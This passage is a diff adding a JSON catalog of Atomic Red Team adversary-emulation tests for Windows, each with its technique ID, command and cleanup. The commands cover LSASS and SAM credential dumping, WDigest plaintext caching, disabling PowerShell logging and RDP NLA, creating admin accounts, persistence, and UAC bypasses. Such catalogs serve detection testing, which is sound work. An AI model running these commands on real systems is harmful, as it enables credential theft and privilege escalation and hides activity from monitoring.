@@ -1,0 +1,574 @@
+{
+  "source": "atomic-red-team",
+  "repository": "redcanaryco/atomic-red-team",
+  "commit": "a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6",
+  "commit_date": "2026-11-06",
+  "license": "MIT",
+  "files": {
+    "atomics/T1003.001/T1003.001.yaml": "b16a9e627e4b35647a5dae6612a535ed7a2a03832f0a2e2966e61696cd07c470",
+    "atomics/T1003.002/T1003.002.yaml": "0546505ede20fa94c0d690ef40c4fb96a711d045e8a122d31695f0a1029c055d",
+    "atomics/T1016/T1016.yaml": "b148ed773b860ff66f19aa45a7e88e4522a35c6a123c0e6937e6d2922ea8a0c0",
+    "atomics/T1021.001/T1021.001.yaml": "13c2033c4c8eedbe8924b114da5ff48cf3a45f6e684baad8f70e0156fd497838",
+    "atomics/T1053.005/T1053.005.yaml": "4e21312a2b23bf4b5945ef2e4b71c7e470b50b71b121bd8faddf8239c44411de",
+    "atomics/T1057/T1057.yaml": "9e7438b7a6ec4caeaf5354955096d94134cfaa476a28d88c78d93451116f7102",
+    "atomics/T1059.001/T1059.001.yaml": "54ebdbccfd6d5435a52bb048b3e8b9de541d8f0bd6c86f97ff982a15f1a76945",
+    "atomics/T1069.001/T1069.001.yaml": "7f56271c6c7cfdcb1a733e38270081738be9ac4f11bec08d8afbd7f14dfe599d",
+    "atomics/T1082/T1082.yaml": "227c971954b4da7bcac0ebc5b6e04644298bc7aa62a5a56df96c0904c0eb3e06",
+    "atomics/T1087.001/T1087.001.yaml": "19ed67c896923e99e03f5ed824d71e680f03134f8e66b3e7eed513ca1261432c",
+    "atomics/T1112/T1112.yaml": "d8c28cac52ab4122a484b28e17638bda11250e095c2f99a145347c78bc0ea27f",
+    "atomics/T1136.001/T1136.001.yaml": "397dee40e2822730f97e9a5e9048ce22139e2d600bb11d5eb04e4375dc258cdc",
+    "atomics/T1218.011/T1218.011.yaml": "024c9aa5bf9221a211bc818ea6913206414b02a2a2d6a7e092bcef20ca9821da",
+    "atomics/T1543.003/T1543.003.yaml": "2cc71de8c236c2e2030c37ae86c39da8aa6ca1e37588e7274949bb4d114a84ec",
+    "atomics/T1547.001/T1547.001.yaml": "d5a38b78011ec61c7a1ded7f52b8896f67f4e3488da83291214be721d3533bd2",
+    "atomics/T1548.002/T1548.002.yaml": "7af3a5333ef26dc32e66e6b50c80daeb41ef1e9be89dcfff88e95751b840ffd6"
+  },
+  "tests": [
+    {
+      "guid": "2536dee2-12fb-459a-8c37-971844fa73be",
+      "technique_id": "T1003.001",
+      "technique_name": "OS Credential Dumping: LSASS Memory",
+      "name": "Dump LSASS.exe Memory using comsvcs.dll",
+      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.",
+      "executor": "powershell",
+      "elevation_required": true,
+      "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n",
+      "cleanup": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n",
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1003.001/T1003.001.yaml",
+      "curation_note": "Dumps LSASS to a file in %TEMP% with a built-in DLL; cleanup deletes the dump."
+    },
+    {
+      "guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
+      "technique_id": "T1003.001",
+      "technique_name": "OS Credential Dumping: LSASS Memory",
+      "name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
+      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_\u003cPID\u003e.dmp and  $env:TEMP\\results_\u003cPID\u003e.hlk.",
+      "executor": "powershell",
+      "elevation_required": true,
+      "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n\u0026 $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n",
+      "cleanup": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore\n",
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1003.001/T1003.001.yaml",
+      "curation_note": "LSASS dump via the rdrleakdiag LOLBin."
+    },
+    {
+      "guid": "21df41be-cdd8-4695-a650-c3981113aa3c",
+      "technique_id": "T1003.002",
+      "technique_name": "OS Credential Dumping: Security Account Manager",
+      "name": "Dumping of SAM, creds, and secrets(Reg Export)",
+      "description": "Local SAM (SAM \u0026 System), cached credentials (System \u0026 Security) and LSA secrets (System \u0026 Security) can be enumerated via three registry keys. Used reg export to execute this behavior\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.",
+      "executor": "command_prompt",
+      "elevation_required": true,
+      "command": "reg export HKLM\\sam %temp%\\sam\nreg export HKLM\\system %temp%\\system\nreg export HKLM\\security %temp%\\security\n",
+      "cleanup": "del %temp%\\sam \u003enul 2\u003e nul\ndel %temp%\\system \u003enul 2\u003e nul\ndel %temp%\\security \u003enul 2\u003e nul\n",
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1003.002/T1003.002.yaml",
+      "curation_note": "Exports SAM/SYSTEM/SECURITY via reg export."
+    },
+    {
+      "guid": "5c2571d0-1572-416d-9676-812e64ca9f44",
+      "technique_id": "T1003.002",
+      "technique_name": "OS Credential Dumping: Security Account Manager",
+      "name": "Registry dump of SAM, creds, and secrets",
+      "description": "Local SAM (SAM \u0026 System), cached credentials (System \u0026 Security) and LSA secrets (System \u0026 Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.",
+      "executor": "command_prompt",
+      "elevation_required": true,
+      "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n",
+      "cleanup": "del %temp%\\sam \u003enul 2\u003e nul\ndel %temp%\\system \u003enul 2\u003e nul\ndel %temp%\\security \u003enul 2\u003e nul\n",
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1003.002/T1003.002.yaml",
+      "curation_note": "Saves SAM/SYSTEM/SECURITY hives to %TEMP%; cleanup deletes them."
+    },
+    {
+      "guid": "038263cb-00f4-4b0a-98ae-0696c67e1752",
+      "technique_id": "T1016",
+      "technique_name": "System Network Configuration Discovery",
+      "name": "List Windows Firewall Rules",
+      "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "netsh advfirewall firewall show rule name=all\n",
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1016/T1016.yaml",
+      "curation_note": "Lists firewall rules."
+    },
+    {
+      "guid": "970ab6a1-0157-4f3f-9a73-ec4166754b23",
+      "technique_id": "T1016",
+      "technique_name": "System Network Configuration Discovery",
+      "name": "System Network Configuration Discovery on Windows",
+      "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n",
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1016/T1016.yaml",
+      "curation_note": "ipconfig, arp, nbtstat, netsh queries."
+    },
+    {
+      "guid": "01d1c6c0-faf0-408e-b368-752a02285cb2",
+      "technique_id": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "name": "Disable NLA for RDP via Command Prompt",
+      "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f\n",
+      "cleanup": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f \u003enul 2\u003e\u00261\n",
+      "inputs": {
+        "Default_UserAuthentication": {
+          "description": "Default UserAuthentication registry value",
+          "type": "string",
+          "default": "1"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1021.001/T1021.001.yaml",
+      "curation_note": "Turns off Network Level Authentication for RDP; cleanup reverts."
+    },
+    {
+      "guid": "42f53695-ad4a-4546-abb6-7d837f644a71",
+      "technique_id": "T1053.005",
+      "technique_name": "Scheduled Task/Job: Scheduled Task",
+      "name": "Scheduled task Local",
+      "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n",
+      "cleanup": "SCHTASKS /Delete /TN spawn /F \u003enul 2\u003e\u00261\n",
+      "inputs": {
+        "task_command": {
+          "description": "What you want to execute",
+          "type": "string",
+          "default": "C:\\windows\\system32\\cmd.exe"
+        },
+        "time": {
+          "description": "What time 24 Hour",
+          "type": "string",
+          "default": "20:10"
+        }
+      },
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1053.005/T1053.005.yaml",
+      "curation_note": "Creates a one-off local scheduled task; cleanup deletes it."
+    },
+    {
+      "guid": "af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd",
+      "technique_id": "T1053.005",
+      "technique_name": "Scheduled Task/Job: Scheduled Task",
+      "name": "Powershell Cmdlet Scheduled Task",
+      "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.",
+      "executor": "powershell",
+      "elevation_required": false,
+      "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n",
+      "cleanup": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false \u003e$null 2\u003e\u00261\n",
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1053.005/T1053.005.yaml",
+      "curation_note": "Creates a scheduled task via PowerShell cmdlets; cleanup deletes it."
+    },
+    {
+      "guid": "c5806a4f-62b8-4900-980b-c7ec004e9908",
+      "technique_id": "T1057",
+      "technique_name": "Process Discovery",
+      "name": "Process Discovery - tasklist",
+      "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "tasklist\n",
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1057/T1057.yaml",
+      "curation_note": "tasklist."
+    },
+    {
+      "guid": "49eb9404-5e0f-4031-a179-b40f7be385e3",
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "name": "PowerShell Invoke Known Malicious Cmdlets",
+      "description": "Powershell execution of known Malicious PowerShell Cmdlets",
+      "executor": "powershell",
+      "elevation_required": true,
+      "command": "$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}\n",
+      "inputs": {
+        "Malicious_cmdlets": {
+          "description": "Known Malicious Cmdlets",
+          "type": "string",
+          "default": "\"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"\n"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1059.001/T1059.001.yaml",
+      "curation_note": "Invokes well-known offensive cmdlet names (not their implementations) to exercise AMSI/AV detection."
+    },
+    {
+      "guid": "fa050f5e-bc75-4230-af73-b6fd7852cd73",
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "name": "PowerShell Fileless Script Execution",
+      "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.",
+      "executor": "powershell",
+      "elevation_required": false,
+      "command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
+      "cleanup": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore\n",
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1059.001/T1059.001.yaml",
+      "curation_note": "Runs an encoded PowerShell payload that only writes a marker file."
+    },
+    {
+      "guid": "1f454dd6-e134-44df-bebb-67de70fb6cd8",
+      "technique_id": "T1069.001",
+      "technique_name": "Permission Groups Discovery: Local Groups",
+      "name": "Basic Permission Groups Discovery Windows (Local)",
+      "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "net localgroup\nnet localgroup \"Administrators\"\n",
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1069.001/T1069.001.yaml",
+      "curation_note": "net localgroup."
+    },
+    {
+      "guid": "66703791-c902-4560-8770-42b8a91f7667",
+      "technique_id": "T1082",
+      "technique_name": "System Information Discovery",
+      "name": "System Information Discovery",
+      "description": "Identify System Info. Upon execution, system info and time info will be displayed.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n",
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1082/T1082.yaml",
+      "curation_note": "systeminfo and related queries."
+    },
+    {
+      "guid": "80887bec-5a9b-4efc-a81d-f83eb2eb32ab",
+      "technique_id": "T1087.001",
+      "technique_name": "Account Discovery: Local Account",
+      "name": "Enumerate all accounts on Windows (Local)",
+      "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n",
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1087.001/T1087.001.yaml",
+      "curation_note": "net user."
+    },
+    {
+      "guid": "95b25212-91a7-42ff-9613-124aca6845a8",
+      "technique_id": "T1112",
+      "technique_name": "Modify Registry",
+      "name": "Windows Powershell Logging Disabled",
+      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016\u0026Policy=Microsoft.Policies.PowerShell::EnableModuleLogging",
+      "executor": "command_prompt",
+      "elevation_required": true,
+      "command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f \u003enul 2\u003e\u00261\n",
+      "cleanup": "reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /f \u003enul 2\u003e\u00261\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /f \u003enul 2\u003e\u00261\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /f \u003enul 2\u003e\u00261\n",
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1112/T1112.yaml",
+      "curation_note": "Disables PowerShell module logging via policy; cleanup reverts."
+    },
+    {
+      "guid": "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18",
+      "technique_id": "T1112",
+      "technique_name": "Modify Registry",
+      "name": "Modify registry to store logon credentials",
+      "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.",
+      "executor": "command_prompt",
+      "elevation_required": true,
+      "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n",
+      "cleanup": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f \u003enul 2\u003e\u00261\n",
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1112/T1112.yaml",
+      "curation_note": "Turns on WDigest plaintext credential caching; cleanup reverts."
+    },
+    {
+      "guid": "6657864e-0323-4206-9344-ac9cd7265a4f",
+      "technique_id": "T1136.001",
+      "technique_name": "Create Account: Local Account",
+      "name": "Create a new user in a command prompt",
+      "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"",
+      "executor": "command_prompt",
+      "elevation_required": true,
+      "command": "net user /add \"#{username}\" \"#{password}\"\n",
+      "cleanup": "net user /del \"#{username}\" \u003enul 2\u003e\u00261\n",
+      "inputs": {
+        "password": {
+          "description": "Password of the user to create",
+          "type": "string",
+          "default": "T1136.001_CMD!"
+        },
+        "username": {
+          "description": "Username of the user to create",
+          "type": "string",
+          "default": "T1136.001_CMD"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1136.001/T1136.001.yaml",
+      "curation_note": "Creates a local user; cleanup deletes it."
+    },
+    {
+      "guid": "fda74566-a604-4581-a4cc-fbbe21d66559",
+      "technique_id": "T1136.001",
+      "technique_name": "Create Account: Local Account",
+      "name": "Create a new Windows admin user",
+      "description": "Creates a new admin user in a command prompt.",
+      "executor": "command_prompt",
+      "elevation_required": true,
+      "command": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add\n",
+      "cleanup": "net user /del \"#{username}\" \u003enul 2\u003e\u00261\n",
+      "inputs": {
+        "password": {
+          "description": "Password of the user to create",
+          "type": "string",
+          "default": "T1136_pass"
+        },
+        "username": {
+          "description": "Username of the user to create",
+          "type": "string",
+          "default": "T1136.001_Admin"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1136.001/T1136.001.yaml",
+      "curation_note": "Creates a local user and adds it to Administrators; cleanup deletes it."
+    },
+    {
+      "guid": "638730e7-7aed-43dc-bf8c-8117f805f5bb",
+      "technique_id": "T1218.011",
+      "technique_name": "System Binary Proxy Execution: Rundll32",
+      "name": "Rundll32 execute VBscript command",
+      "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n",
+      "inputs": {
+        "command_to_execute": {
+          "description": "Command for rundll32.exe to execute",
+          "type": "string",
+          "default": "calc.exe"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1218.011/T1218.011.yaml",
+      "curation_note": "rundll32 runs VBScript via mshtml to launch a benign command."
+    },
+    {
+      "guid": "1f896ce4-8070-4959-8a25-2658856a70c9",
+      "technique_id": "T1543.003",
+      "technique_name": "Create or Modify System Process: Windows Service",
+      "name": "Modify Service to Run Arbitrary Binary (Powershell)",
+      "description": "This test will use PowerShell to temporarily modify a service to run an arbitrary executable by changing its binary path and will then revert the binary path change, restoring the service to its original state.\nThis technique was previously observed through SnapMC's use of Powerspolit's invoke-serviceabuse function. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)",
+      "executor": "powershell",
+      "elevation_required": true,
+      "command": "Stop-Service -Name \"#{service_name}\" -force -erroraction silentlycontinue | Out-Null\nset-servicebinarypath -name \"#{service_name}\" -path \"#{new_bin_path}\"\nstart-service -Name \"#{service_name}\" -erroraction silentlycontinue | out-null",
+      "cleanup": "Stop-Service -Name \"#{service_name}\" -force -erroraction silentlycontinue | Out-Null\nset-servicebinarypath -name \"#{service_name}\" -path \"#{original_bin_path}\" -erroraction silentlycontinue | out-null",
+      "inputs": {
+        "new_bin_path": {
+          "description": "Path of the new service binary",
+          "type": "String",
+          "default": "$env:windir\\system32\\notepad.exe"
+        },
+        "original_bin_path": {
+          "description": "Path of the original service binary",
+          "type": "String",
+          "default": "$env:windir\\system32\\fxssvc.exe"
+        },
+        "service_name": {
+          "description": "Name of the service to modify",
+          "type": "string",
+          "default": "fax"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1543.003/T1543.003.yaml",
+      "curation_note": "Repoints a service binary path at a benign binary; cleanup restores the service."
+    },
+    {
+      "guid": "554cbd88-cde1-4b56-8168-0be552eed9eb",
+      "technique_id": "T1547.001",
+      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+      "name": "Reg Key RunOnce",
+      "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout.",
+      "executor": "command_prompt",
+      "elevation_required": true,
+      "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n",
+      "cleanup": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f \u003enul 2\u003e\u00261\n",
+      "inputs": {
+        "thing_to_execute": {
+          "description": "Thing to Run",
+          "type": "path",
+          "default": "C:\\Path\\AtomicRedTeam.dll"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1547.001/T1547.001.yaml",
+      "curation_note": "Adds a machine-wide RunOnceEx entry; cleanup removes it."
+    },
+    {
+      "guid": "e55be3fd-3521-4610-9d1a-e210e42dcf05",
+      "technique_id": "T1547.001",
+      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+      "name": "Reg Key Run",
+      "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"\n",
+      "cleanup": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f \u003enul 2\u003e\u00261\n",
+      "inputs": {
+        "command_to_execute": {
+          "description": "Thing to Run",
+          "type": "path",
+          "default": "C:\\Path\\AtomicRedTeam.exe"
+        }
+      },
+      "risk_tier": "benign",
+      "origin": "catalog",
+      "source_path": "atomics/T1547.001/T1547.001.yaml",
+      "curation_note": "Adds a per-user Run key pointing at a benign binary; cleanup removes it."
+    },
+    {
+      "guid": "5073adf8-9a50-4bd9-b298-a9bd2ead8af9",
+      "technique_id": "T1548.002",
+      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+      "name": "Bypass UAC using Event Viewer (cmd)",
+      "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n",
+      "cleanup": "reg.exe delete hkcu\\software\\classes\\mscfile /f \u003enul 2\u003e\u00261\n",
+      "inputs": {
+        "executable_binary": {
+          "description": "Binary to execute with UAC Bypass",
+          "type": "path",
+          "default": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1548.002/T1548.002.yaml",
+      "curation_note": "Event Viewer (mscfile) UAC bypass; cleanup removes the hijack key."
+    },
+    {
+      "guid": "58f641ea-12e3-499a-b684-44dee46bd182",
+      "technique_id": "T1548.002",
+      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+      "name": "Bypass UAC using Fodhelper",
+      "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n",
+      "cleanup": "reg.exe delete hkcu\\software\\classes\\ms-settings /f \u003enul 2\u003e\u00261\n",
+      "inputs": {
+        "executable_binary": {
+          "description": "Binary to execute with UAC Bypass",
+          "type": "path",
+          "default": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1548.002/T1548.002.yaml",
+      "curation_note": "Fodhelper UAC bypass launching a benign binary; cleanup removes the hijack key."
+    },
+    {
